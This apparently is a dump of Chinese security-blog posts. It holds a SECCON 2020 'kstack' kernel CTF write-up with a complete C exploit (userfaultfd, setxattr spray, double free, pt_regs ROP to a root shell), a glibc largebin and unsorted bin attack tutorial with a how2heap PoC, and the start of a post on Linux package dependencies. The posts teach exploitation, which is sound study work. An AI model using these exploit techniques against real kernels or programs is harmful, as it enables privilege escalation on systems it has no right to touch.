error;&#125;\n\n我发现linux5.19版本里的setxattr函数的代码发生了变化，对于新版本的利用我还了解到比较少这里就不展开说了。可以看到上述代码中可以直接进行kvmalloc之后copy_from_user并且size和value都是我门可控的但是最后会free掉object。\nsetxattr &amp; userfaultfd虽然我们可控一个object的内容，但是最后始终会free掉导致我们前功尽弃了。但是看过上一篇文章可以注意到在函数中会调用到copy_from_user从用户空间拷贝数据。那么我们可以产生下述想法：\n我们通过 mmap 分配连续的两个页面，在第二个页面上启用 userfaultfd 监视，并在第一个页面的末尾写入我们想要的数据，此时我们调用 setxattr 进行跨页面的拷贝，当 copy_from_user 拷贝到第二个页面时便会触发 userfaultfd，从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用：\n\n上述就是 setxattr + userfaultfd的堆占位技术\n例题：SECCON 2020 kstack题目分析题目开启保护有：smep，KPTI，kaslr\n并且题目给的驱动模块只有一个ioctl函数可供利用。\nv4 = *(_DWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 860);v8 = kmem_cache_alloc(kmalloc_caches[5], 0x6000C0LL); // size:0x20*(_DWORD *)v8 = v4;v9 = head;head = v8;*(_QWORD *)(v8 + 16) = v9;if ( !copy_from_user(v8 + 8, v3, 8LL) )  return 0LL;head = *(_QWORD *)(v8 + 16);kfree(v8);return -22LL;\n\n这里分配使用了kmem_cache_alloc(kmalloc_caches[5], 0x6000C0LL);，第二个参数是 flag ，为常规的 GFP_KERNEL这里可以暂且忽略。主要关注的是第一个参数，内核中有一个数组kmalloc_caches存放着kmalloc_cache\nconst struct kmalloc_info_struct kmalloc_info[] __initconst = &#123;\tINIT_KMALLOC_INFO(0, 0),\tINIT_KMALLOC_INFO(96, 96),\tINIT_KMALLOC_INFO(192, 192),\tINIT_KMALLOC_INFO(8, 8),\tINIT_KMALLOC_INFO(16, 16),\tINIT_KMALLOC_INFO(32, 32),\tINIT_KMALLOC_INFO(64, 64),\tINIT_KMALLOC_INFO(128, 128),\tINIT_KMALLOC_INFO(256, 256),\tINIT_KMALLOC_INFO(512, 512),\tINIT_KMALLOC_INFO(1024, 1k),\tINIT_KMALLOC_INFO(2048, 2k),\tINIT_KMALLOC_INFO(4096, 4k),\tINIT_KMALLOC_INFO(8192, 8k),\tINIT_KMALLOC_INFO(16384, 16k),\tINIT_KMALLOC_INFO(32768, 32k),\tINIT_KMALLOC_INFO(65536, 64k),\tINIT_KMALLOC_INFO(131072, 128k),\tINIT_KMALLOC_INFO(262144, 256k),\tINIT_KMALLOC_INFO(524288, 512k),\tINIT_KMALLOC_INFO(1048576, 1M),\tINIT_KMALLOC_INFO(2097152, 2M),\tINIT_KMALLOC_INFO(4194304, 4M),\tINIT_KMALLOC_INFO(8388608, 8M),\tINIT_KMALLOC_INFO(16777216, 16M),\tINIT_KMALLOC_INFO(33554432, 32M)&#125;;\n\n可以看到kmem_caches[5]对应的大小也就是32。然后这里object的前四个字节存放的内容为线程组的id。那么可以推测出结构体：\nstruct node&#123;  long int id;  char data[8];  struct node *prev;&#125;;\n\nv4 = *(_DWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 860);if ( a2 != 0x57AC0001 )&#123;  if ( a2 != 0x57AC0002 )    return 0LL;  v5 = head;  if ( !head )    return 0LL;  if ( v4 == LODWORD(head-&gt;id) )  &#123;    if ( !copy_to_user(a3, &amp;head-&gt;data, 8LL) )    &#123;      v6 = v5;      head = (struct node *)v5-&gt;prev;      goto LABEL_12;    &#125;  &#125;  else  &#123;    v6 = (struct node *)head-&gt;prev;    if ( v6 )    &#123;      while ( LODWORD(v6-&gt;id) != v4 )      &#123;        v5 = v6;        if ( !v6-&gt;prev )          return -22LL;        v6 = (struct node *)v6-&gt;prev;      &#125;      if ( !copy_to_user(a3, &amp;v6-&gt;data, 8LL) )      &#123;        v5-&gt;prev = v6-&gt;prev;        LABEL_12:        kfree(v6);        return 0LL;      &#125;    &#125;  &#125;  return -22LL;&#125;\n\n然后就是上面这个功能，这里首先判断id是否等于当前进程的id如果是则取出数据，若果不是则开始进行循环查找，找到是当前进程id的object再读取数据。在读取出数据之后会进行脱链然后进行free操作。\n利用过程可以注意到上述代码中都没有锁的操作，所以这也为userfaultfd提供了可能性。\nleak这里只可以读取object+8位置处的数据，这里选择的结构体为： shm_file_data\nstruct shm_file_data &#123;    int id;    struct ipc_namespace *ns;    struct file *file;    const struct vm_operations_struct *vm_ops;&#125;;\n\n这里ns位置存放的是kernel的.text段的地址。所以正好是可以泄漏出kernel地址。这里使用的办法就是先创建一个shm结构体随后释放掉，然后我们利用驱动申请一个object，使用userfaultfd阻止我们的数据写入到object中，然后在同一个线程读取出来内容。\nattack后续的利用需要使用到double free，这里的double free不知道为什么是可以直接进行的不需要中间隔一个object，所以有清楚的师傅希望可以在评论区告诉我一下。最后就是使用seq_operations和setxattr进行劫持。在最后会用到堆占位的技术，即我们在setxattr中的copy_from_user时，我们只需要将前面0x8个字节的内容复制到seq_operations中，那么后续使用pt_regs进行稳定的拿到root shell。\n对于pt_regs有疑问的可以看一下我前面文章中 0CTF 2021 final kernote 这道题的做法。\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/xattr.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;sys/shm.h&gt;#include &lt;poll.h&gt;unsigned long *kernel_addr;unsigned long kernel_base;unsigned long kernel_offset;unsigned long *seq_fd_reserve[0x100];int fd;int seq_fd;void create(unsigned long *buf)&#123;    ioctl(fd, 0x57AC0001, buf);&#125;void delete (unsigned long *buf)&#123;    ioctl(fd, 0x57AC0002, buf);&#125;void ErrExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void RegisterUserfault(void *fault_page, unsigned long len, void *handler)&#123;    pthread_t thr;    struct uffdio_api ua;    struct uffdio_register ur;    uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);    ua.api = UFFD_API;    ua.features = 0;    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)        ErrExit(&quot;[-] ioctl-UFFDIO_API&quot;);    ur.range.start = (unsigned long)fault_page;    ur.range.len = len;    ur.mode = UFFDIO_REGISTER_MODE_MISSING;    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1)        ErrExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);    int s = pthread_create(&amp;thr, NULL, handler, (void *)uffd);    if (s != 0)        ErrExit(&quot;[-] pthread_create&quot;);&#125;void *leak_handler(void *arg)&#123;    struct uffd_msg msg;    unsigned long uffd = (unsigned long)arg;    puts(&quot;[+] leak handler created&quot;);    int nready;    struct pollfd pollfd;    pollfd.fd = uffd;    pollfd.events = POLLIN;    nready = poll(&amp;pollfd, 1, -1);    puts(&quot;[+] leak handler unblocked&quot;);    // pause();    delete (&amp;kernel_addr);    printf(&quot;[*]leak ptr:%p\\n&quot;, kernel_addr);    kernel_base = kernel_addr - 0x186f78;    kernel_offset = kernel_base - 0xffffffff81000000;    if (nready != 1)    &#123;        ErrExit(&quot;[-] Wrong poll return val&quot;);    &#125;    nready = read(uffd, &amp;msg, sizeof(msg));    if (nready &lt;= 0)    &#123;        ErrExit(&quot;[-] msg err&quot;);    &#125;    char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    if (page == MAP_FAILED)    &#123;        ErrExit(&quot;[-] mmap err&quot;);    &#125;    struct uffdio_copy uc;    // init page    memset(page, 0, sizeof(page));    uc.src = (unsigned long)page;    uc.dst = (unsigned long)msg.arg.pagefault.address &amp; ~(0x1000 - 1);    uc.len = 0x1000;    uc.mode = 0;    uc.copy = 0;    ioctl(uffd, UFFDIO_COPY, &amp;uc);    puts(&quot;[+] leak handler done&quot;);    return NULL;&#125;void *double_free_handler(void *arg)&#123;    struct uffd_msg msg;    unsigned long uffd = (unsigned long)arg;    puts(&quot;[+] double free handler created&quot;);    int nready;    struct pollfd pollfd;    pollfd.fd = uffd;    pollfd.events = POLLIN;    nready = poll(&amp;pollfd, 1, -1);    puts(&quot;[+] double free handler unblocked&quot;);    // pause();    char *tmp = malloc(0x100);    delete (tmp);    if (nready != 1)    &#123;        ErrExit(&quot;[-] Wrong poll return val&quot;);    &#125;    nready = read(uffd, &amp;msg, sizeof(msg));    if (nready &lt;= 0)    &#123;        ErrExit(&quot;[-] msg err&quot;);    &#125;    char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    if (page == MAP_FAILED)    &#123;        ErrExit(&quot;[-] mmap err&quot;);    &#125;    struct uffdio_copy uc;    // init page    memset(page, 0, sizeof(page));    uc.src = (unsigned long)page;    uc.dst = (unsigned long)msg.arg.pagefault.address &amp; ~(0x1000 - 1);    uc.len = 0x1000;    uc.mode = 0;    uc.copy = 0;    ioctl(uffd, UFFDIO_COPY, &amp;uc);    puts(&quot;[+] double free handler done&quot;);    return NULL;&#125;unsigned long pop_rdi;unsigned long swapgs_restore_regs_and_return_to_usermode;unsigned long commit_creds;unsigned long init_cred;unsigned long prepare_kernel_cred;unsigned long mov_rdi_rax_pop_rbp_ret;void *getroot_handler(void *arg)&#123;    struct uffd_msg msg;    unsigned long uffd = (unsigned long)arg;    puts(&quot;[+] getroot handler created&quot;);    int nready;    struct pollfd pollfd;    pollfd.fd = uffd;    pollfd.events = POLLIN;    nready = poll(&amp;pollfd, 1, -1);    puts(&quot;[+] getroot handler unblocked&quot;);    puts(&quot;[*] setxattr trapped in userfaultfd.&quot;);    for (int i = 0; i &lt; 100; i++)        close(seq_fd_reserve[i]);    // pause();    pop_rdi = 0xffffffff81034505 + kernel_offset;    commit_creds = 0xffffffff81069c10 + kernel_offset;    swapgs_restore_regs_and_return_to_usermode = 0xffffffff81600a34 + kernel_offset + 0x10;    prepare_kernel_cred = 0xffffffff81069e00 + kernel_offset;    mov_rdi_rax_pop_rbp_ret = 0xffffffff8121f89a + kernel_offset;    __asm__(        &quot;mov r15,   0xbeefdead\\n&quot;        &quot;mov r14,   0xbeefdead\\n&quot;        &quot;mov r13,   pop_rdi\\n&quot;        &quot;mov r12,   0\\n&quot;        &quot;mov rbp,   prepare_kernel_cred\\n&quot;        &quot;mov rbx,   mov_rdi_rax_pop_rbp_ret\\n&quot;        &quot;mov r11,   0xbeefdead\\n&quot;        &quot;mov r10,   commit_creds\\n&quot;        &quot;mov r9,    swapgs_restore_regs_and_return_to_usermode\\n&quot;        &quot;mov r8,    0xbeefdead\\n&quot;        &quot;xor rax,   rax\\n&quot;        &quot;mov rcx,   0xbeefdead\\n&quot;        &quot;mov rdx,   8\\n&quot;        &quot;mov rsi,   rsp\\n&quot;        &quot;mov rdi,   seq_fd\\n&quot;        &quot;syscall&quot;);    puts(&quot;[*] execve root shell now...&quot;);    system(&quot;/bin/sh&quot;);    if (nready != 1)    &#123;        ErrExit(&quot;[-] Wrong poll return val&quot;);    &#125;    nready = read(uffd, &amp;msg, sizeof(msg));    if (nready &lt;= 0)    &#123;        ErrExit(&quot;[-] msg err&quot;);    &#125;    char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    if (page == MAP_FAILED)    &#123;        ErrExit(&quot;[-] mmap err&quot;);    &#125;    struct uffdio_copy uc;    // init page    memset(page, 0, sizeof(page));    uc.src = (unsigned long)page;    uc.dst = (unsigned long)msg.arg.pagefault.address &amp; ~(0x1000 - 1);    uc.len = 0x1000;    uc.mode = 0;    uc.copy = 0;    ioctl(uffd, UFFDIO_COPY, &amp;uc);    puts(&quot;[+] getroot handler done&quot;);    return NULL;&#125;int main()&#123;    fd = open(&quot;/proc/stack&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        printf(&quot;[-] Error opening /proc/stack\\n&quot;);        exit(-1);    &#125;    unsigned long *buf = malloc(0x4000);    unsigned long *leak_buf;    int shm_id;    unsigned long *shm_addr;    unsigned long *double_free_buf;    char *getroot_buf;    memset(buf, &#x27;a&#x27;, 0x1000);    for (int i = 0; i &lt; 100; i++)    &#123;        if ((seq_fd_reserve[i] = open(&quot;/proc/self/stat&quot;, O_RDONLY)) &lt; 0)            ErrExit(&quot;seq reserve!&quot;);    &#125;    leak_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);    RegisterUserfault(leak_buf, 0x1000, leak_handler);    shm_id = shmget(114514, 0x1000, SHM_R | SHM_W | IPC_CREAT);    if (shm_id &lt; 0)        ErrExit(&quot;shmget!&quot;);    shm_addr = shmat(shm_id, NULL, 0);    if (shm_addr &lt; 0)        ErrExit(&quot;shmat!&quot;);    if (shmdt(shm_addr) &lt; 0)        ErrExit(&quot;shmdt!&quot;);    create(leak_buf);    printf(&quot;[*]kernel_base=&gt;%p\\n&quot;, kernel_base);    printf(&quot;[*]kernel_offset=&gt;%p\\n&quot;, kernel_offset);    double_free_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);    RegisterUserfault(double_free_buf, 0x1000, double_free_handler);    create(&quot;196082&quot;);    delete (double_free_buf);    printf(&quot;[*] double free\\n&quot;);    getroot_buf = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);    RegisterUserfault(getroot_buf + 0x1000, 0x1000, getroot_handler);    *(unsigned long *)(getroot_buf + 0x1000 - 8) = 0xffffffff814d51c0 + kernel_offset;    // // add rsp , 0x1c8 ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15; pop rbp ; ret    printf(&quot;gadget=&gt;%p\\n&quot;, *(unsigned long *)(getroot_buf + 0x1000 - 8));    seq_fd = open(&quot;/proc/self/stat&quot;, O_RDONLY);    setxattr(&quot;/exp&quot;, &quot;196082&quot;, getroot_buf + 0x1000 - 8, 32, 0);    return 0;&#125;\n\n\n题目放在：https://github.com/196082/196082/tree/main/kernel_pwn\n\n参考链接：https://www.anquanke.com/post/id/266898#h3-5\n","categories":["kernel-pwn"],"tags":["userfaultfd","setxattr","pt_regs"]},{"title":"largebin attack","url":"/2022/02/23/largebin-attack/","content":"关于largebin的原理这里就只给一张图吧，也是在网上找的(我懒得画)。\n\nlargebin一直是容易被忽略的利用方式(可能只是我这样吧)，在此之前我一直觉得largebin不会出现直到最近的比赛怎么全是这玩意，所以又下来学习了一遍。\nGlibc2.23到Glibc2.27下的largebin attack其实Glibc2.27和Glibc2.23的利用方式都差不多，只不过在2.27里增加了tcache机制，所以想实现largebin attack要么占满tcache，或则大于tcache范围。\n下面源码是当unsorted bin 当作的chunk进入large bin的过程\nvictim_index = largebin_index (size);bck = bin_at (av, victim_index); fwd = bck-&gt;fd;/* maintain large bins in sorted order */if (fwd != bck)&#123;    /* Or with inuse bit to speed comparisons */    size |= PREV_INUSE;    /* if smaller than smallest, bypass loop below */    assert (chunk_main_arena (bck-&gt;bk));    if ((unsigned long) (size)                       &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))    &#123;        fwd = bck;        bck = bck-&gt;bk;        victim-&gt;fd_nextsize = fwd-&gt;fd;        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;         fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;    &#125;    else     &#123;        assert (chunk_main_arena (fwd));        while ((unsigned long) size &lt; chunksize_nomask (fwd))         &#123;            fwd = fwd-&gt;fd_nextsize;            assert (chunk_main_arena (fwd));        &#125;        if ((unsigned long) size            == (unsigned long) chunksize_nomask (fwd))            /* Always insert in the second position.  */            fwd = fwd-&gt;fd;         else        &#123;            victim-&gt;fd_nextsize = fwd;            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;            fwd-&gt;bk_nextsize = victim;            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;        &#125;        bck = fwd-&gt;bk;    &#125;&#125;else    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;&#125;mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;\n\n这里的第二个if判断的就是size如果小于最小的size的时候发生的事情，但是那里的内容相较于下面不是很好利用。所以直接看下面。\n    if ((unsigned long) size        == (unsigned long) chunksize_nomask (fwd))        /* Always insert in the second position.  */        fwd = fwd-&gt;fd;     else    &#123;        victim-&gt;fd_nextsize = fwd;        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;        fwd-&gt;bk_nextsize = victim;        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;    &#125;    bck = fwd-&gt;bk;    &#125;    else        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;    &#125;mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;\n\n这里就是我们主要的利用代码，这里的if判断的是找到相同size的chunk发生什么，但是我们真正利用的代码其实是else里面的。现在假设我们存在一个已经在large bin的chunk1：\nsize = 0x450;&#123;    fd = 0;    bk = 0;    fd_nextsize = 0;    bk_nextsize = target-0x20;&#125;\n\n和一个在unsorted bin当中的chunk2：\nsize = 0x460;&#123;    fd = 0;    bk = 0;    fd_nextsize = 0;    bk_nextsize = 0;&#125;\n\n当我们下一次malloc一个size大于0x460的chunk时那么chunk2就会进入large bin，此时就会执行以下代码：\nvictim-&gt;fd_nextsize = fwd;victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;fwd-&gt;bk_nextsize = victim;victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n\n翻译过来就是：\nchunk2-&gt;fd_nextsize = chunk1;chunk2-&gt;bk_nextsize = chunk1-&gt;bk_nextsize; // chunk1-&gt;bk_nextsize = target-0x20// 这一步过后，chunk2-&gt;bk_next_size也就变成了target-0x20chunk1-&gt;bk_nextsize = chunk2;chunk2-&gt;bk_nextsize-&gt;fd_nextsize = chunk2;// 所以这一步最终的形式其实是*(target-0x20)-&gt;fd_nextsize = chunk2;\n\nvictim这样就在target位置写上了chunk2的地址。\n另外在这里还存在另一个可以任意地址写入堆地址的地方：\n此时chunk1变为:\nsize = 0x450;&#123;    fd = 0;    bk = target-0x10;    fd_nextsize = 0;    bk_nextsize = 0;&#125;\n\n\n\n// bck = fwd-&gt;bk;   上面执行完之后有这样一句victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;\n\n翻译过来也就是：\nchunk2-&gt;bk = target-0x10;chunk2-&gt;fd = chunk1;chunk1-&gt;bk = chunk2;*(target-0x10)-&gt;fd = chunk2;\n\n也就是如果同时修改了bk和bk_nextsize的话可以同时修改两处地址的值为堆地址。\nGlibc2.29下的largebin attack这里的攻击方式和上面的很类似，首先看一下源码：\n    \tvictim_index = largebin_index (size);       bck = bin_at (av, victim_index);      fwd = bck-&gt;fd;      /* maintain large bins in sorted order */      if (fwd != bck)        &#123;          /* Or with inuse bit to speed comparisons */          size |= PREV_INUSE;          /* if smaller than smallest, bypass loop below */          assert (chunk_main_arena (bck-&gt;bk));          if ((unsigned long) (size)  &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))            &#123;              fwd = bck;              bck = bck-&gt;bk;              victim-&gt;fd_nextsize = fwd-&gt;fd;              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;               fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;            &#125;          else            &#123;              assert (chunk_main_arena (fwd));              while ((unsigned long) size &lt; chunksize_nomask (fwd))                &#123;                  fwd = fwd-&gt;fd_nextsize;assert (chunk_main_arena (fwd));                &#125;              // but size must be different              if ((unsigned long) size== (unsigned long) chunksize_nomask (fwd))                /* Always insert in the second position.  */                fwd = fwd-&gt;fd;              else                &#123;                  victim-&gt;fd_nextsize = fwd;                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                  fwd-&gt;bk_nextsize = victim;                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                 &#125;              bck = fwd-&gt;bk;            &#125;        &#125;      else        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;\n\n其实很明显的可以看出来下面仍然存在相应的漏洞\nvictim-&gt;fd_nextsize = fwd;victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;fwd-&gt;bk_nextsize = victim;victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; \n\nunsorted bin attack在这里说一下unsorted bin attack，虽然在2.29出来之后基本就没法利用了但是害怕题目出的libc版本在以往的版本然后又限制大小所以这里还是提一下unsorted bin attack\n这里就不提出全部源码就把存在漏洞的两行提出来：\nunsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);\n\n可以看出来如果我们可以控制unsorted_chunks (av)的bk指针，那就可以向任意地址写入堆地址了。\n这里直接给出how2heap当中的poc吧：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    printf(&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stackn&quot;);    printf(&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;           &quot;global variable global_max_fast in libc for further fastbin attacknn&quot;);    unsigned long stack_var=0;    printf(&quot;Let&#x27;s first look at the target we want to rewrite on stack:n&quot;);    printf(&quot;%p: %ldnn&quot;, &amp;stack_var, stack_var);    unsigned long *p=malloc(400);    printf(&quot;Now, we allocate first normal chunk on the heap at: %pn&quot;,p);    printf(&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;           &quot;the first one during the free()nn&quot;);    malloc(500);    free(p);    printf(&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;           &quot;point to %pn&quot;,(void*)p[1]);    //------------VULNERABILITY-----------    p[1]=(unsigned long)(&amp;stack_var-2);    printf(&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointern&quot;);    printf(&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%pnn&quot;,(void*)p[1]);    //------------------------------------    malloc(400);    printf(&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, target should has already been &quot;           &quot;rewrite:n&quot;);    printf(&quot;%p: %pn&quot;, &amp;stack_var, (void*)stack_var);&#125;\n\n写的很详细，如果看不懂可以-g编译调试一下。\nGlibc2.31下的largebin attack先看一下源码：\nif (fwd != bck)&#123;    /* Or with inuse bit to speed comparisons */    size |= PREV_INUSE;    /* if smaller than smallest, bypass loop below */    assert (chunk_main_arena (bck-&gt;bk));    if ((unsigned long) (size)        &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))    &#123;        fwd = bck;        bck = bck-&gt;bk;        victim-&gt;fd_nextsize = fwd-&gt;fd;        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;    &#125;    else    &#123;        assert (chunk_main_arena (fwd));        while ((unsigned long) size &lt; chunksize_nomask (fwd))        &#123;            fwd = fwd-&gt;fd_nextsize;            assert (chunk_main_arena (fwd));        &#125;        if ((unsigned long) size            == (unsigned long) chunksize_nomask (fwd))            /* Always insert in the second position.  */            fwd = fwd-&gt;fd;        else        &#123;            victim-&gt;fd_nextsize = fwd;            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;            if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))                malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);            fwd-&gt;bk_nextsize = victim;            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;        &#125;        bck = fwd-&gt;bk;        if (bck-&gt;fd != fwd)            malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);    &#125;&#125;else    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;&#125;\n\n这里可以看到西面我们以前利用的地方都加上了检查，导致我们没法再从这个地方出发利用了，但是上面是没有任何保护的。\nif ((unsigned long) (size)    &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;    fwd = bck;    bck = bck-&gt;bk;    victim-&gt;fd_nextsize = fwd-&gt;fd;    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;&#125;\n\n其实根据上面几个版本的glibc来看这里的利用思路其实是挺明显的，我们只需要修改fwd-&gt;fd-&gt;bk_nextsize也能实现上面的操作。\n比如，现在存在一个已经在large bin 当中的chunk1：\nsize = 0x460&#123;    fd = largebin(index); // 其实在最上面的图能够看出来这里其实保存的是largebin当中相应的位置    bk = largebin(index);    fd_nextsize = 0;    bk_nextsize = target-0x20;&#125;\n\n还有一个即将放入large bin当中的chunk2：\nsize = 0x450&#123;    fd = 0;    bk = 0;    fd_nextsize = 0;    bk_nextsize = 0;&#125;\n\n可以看到将上面的翻译下来其实就是\nchunk2-&gt;fd_nextsize = largebin(index);chunk2-&gt;bk_nextsize = largebin(index)-&gt;bk_nextsize;// 这里的largebin一定存放的是chunk1所以后面的表达式等价于chunk1-&gt;bk_nextsize也就是target-0x20*(target-0x20)-&gt;fd_nextsize = chunk2;// 前面的那个不需要管\n\n这样也就同样实现了任意地址写上堆地址。\n任意地址写上堆地址的利用方式很多，比如VN那道题为FSOP做铺垫，或则修改global_max_fast的值到一个很大的值，为fastbin attack做铺垫，一般来说这种攻击手法都是为其他的攻击手法做铺垫的。\n\n参考链接：\nhttps://www.anquanke.com/post/id/244018\n","categories":["pwn"],"tags":["largebin attack"]},{"title":"linux软件安装时到底在做什么?","url":"/2022/04/07/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E6%97%B6%E5%88%B0%E5%BA%95%E5%9C%A8%E5%81%9A%E4%BB%80%E4%B9%88/","content":"除了CTF外我其实还是一个特别喜欢搞linux的一个垃圾，在2020年11月份左右我将电脑系统换到了kali并且因为当时不会装双系统把windows搞没了，不过用过一段时间发现linux的操作逻辑更加的符合我。\n依赖linux的依赖问题一直是被人诟病的，尤其是debian系的(arch系我感觉几乎没遇到过依赖问题)，在进行安装的总是会出来这个套那个，导致我以前使用ubuntu时安装一个程序可能得花上一下午的时间，而且几乎全部时间都在解决依赖问题。\n那么问题来了，依赖到底是什么？\n首先需要说明的是windows和linux其实都是存在依赖问题的，比如我以前在windows虚拟机里面运行ida的时候就会出现依赖问题，不过网上都有现成的包直接安装就好。虽然按理来说linux也存在依赖的包，但是为什么linux的依赖问题会比windows更加经常发生呢？\n举个例子：现在运行一个程序需要依赖a-1，我使用windows找到了这个依赖的安装包，实际上这个安装包安装下来的是a-1,a-2,,,,a-30。但是纯纯的linux只会帮你安装a-1，下一次遇到需要a-12的时候，windows不会报错但是linux又需要安装另外版本的依赖了。\n上面的看过了之后就大概对linux的依赖问题有一定了解了，那么为了更好的了解依赖问题我们首先需要知道\n安装一个包的过程\n首先可以看到linux和window的不同，linux的安装包是真的非常单纯的压缩整合到一起，最后由包管理器将不同功能的文件放到不同目录。\n在上面这张图里面我们需要重点关注的data.tar.xz\n\n查看其内部可以发现就是一个usr目录\n\n这里就是我们熟悉的desktop，也就是桌面图标\n\n可以看到bin目录是一个链接符号\ntcdy@archlinux /mnt/5F2601400CC8834D/save/usr/bin % ls -l typora lrwxrwxrwx 1 root root 22 Apr  7 10:51 typora -&gt; ../share/typora/Typora\n\n可以看到就是链接到了一个可执行文件，当我们双击文件就可以打开typora了。\n找到可执行程序之后只需要使用ldd即可查看需要的依赖\ntcdy@archlinux ..5F2601400CC8834D/save/usr/share/typora % ldd Typora \tlinux-vdso.so.1 (0x00007ffe581fd000)\tlibffmpeg.so =&gt; /mnt/5F2601400CC8834D/save/usr/share/typora/./libffmpeg.so (0x00007fefa6baa000)\tlibdl.so.2 =&gt; /usr/lib/libdl.so.2 (0x00007fefa6b7e000)\tlibpthread.so.0 =&gt; /usr/lib/libpthread.so.0 (0x00007fefa6b79000)\tlibgobject-2.0.so.0 =&gt; /usr/lib/libgobject-2.0.so.0 (0x00007fefa6b1a000)\tlibglib-2.0.so.0 =&gt; /usr/lib/libglib-2.0.so.0 (0x00007fefa69dc000)\tlibxshmfence.so.1 =&gt; /usr/lib/libxshmfence.so.1 (0x00007fefa69d7000)\tlibgio-2.0.so.0 =&gt; /usr/lib/libgio-2.0.so.0 (0x00007fefa6807000)\tlibnss3.so =&gt; /usr/lib/libnss3.so (0x00007fefa66d4000)\tlibnssutil3.so =&gt; /usr/lib/libnssutil3.so (0x00007fefa66a1000)\tlibsmime3.so =&gt; /usr/lib/libsmime3.so (0x00007fefa6678000)\tlibnspr4.so =&gt; /usr/lib/libnspr4.so (0x00007fefa6636000)\tlibatk-1.0.so.0 =&gt; /usr/lib/libatk-1.0.so.0 